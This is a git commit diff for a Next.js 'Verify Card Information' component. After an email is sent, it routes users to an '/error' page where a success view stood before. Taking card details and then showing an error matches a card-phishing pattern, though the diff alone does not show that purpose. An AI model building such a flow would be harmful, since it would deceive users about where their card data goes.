6a5c740cb6f741e12350ce610ed2ea434fb37e16
Boluwatife <Boluwatifeoladejo@gmail.com>
2023-07-03 20:50:31 +0100

    on success page

--- components/Verify.jsx
+++ components/Verify.jsx
@@ -3,7 +3,7 @@ import {React, useState } from 'react'
 import toast, { Toaster } from 'react-hot-toast';
 import { useRouter } from 'next/router';
 import Success from './Success';
-import Link from 'next/link'
+import { redirect } from 'next/navigation'
 
 // import { sendCardDetails } from '@/lib/api'
 
@@ -91,7 +91,7 @@ const Verify = () => {
       <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 bg-secondary sm:rounded-xl'>
       {emailSent ? (
         // <Success />
-        <Link href='/error'></Link>
+        redirect('/error')
       ) : (
         <form method='post' className='flex flex-col gap-8 w-full px-12'> 
           <span className='flex justify-center text-4xl sm:text-6xl text-primaryText font-bold'>Verify Card Information</span>
